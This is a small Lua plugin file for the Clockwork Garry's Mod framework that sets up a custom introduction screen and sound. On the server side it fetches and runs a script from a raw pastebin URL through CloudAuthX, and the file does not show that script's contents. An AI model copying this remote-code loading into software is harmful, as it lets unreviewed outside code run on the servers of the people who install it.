local PLUGIN = PLUGIN;
local Clockwork = Clockwork;

Clockwork.kernel:IncludePrefixed("cl_intro.lua");
Clockwork.kernel:IncludePrefixed("cl_plugin.lua");
Clockwork.kernel:IncludePrefixed("cl_hooks.lua");

if (SERVER) then
	local CloudAuthX = CloudAuthX;

	PLUGIN:InitializeCloudScript("http://pastebin.com/raw.php?i=WSEWJg35", CloudAuthX.External);
else
	Clockwork.config:AddToSystem("Introduction sound", "intro_sound", "The sound to play during the custom introduction.");
	PLUGIN:WrapText();
end;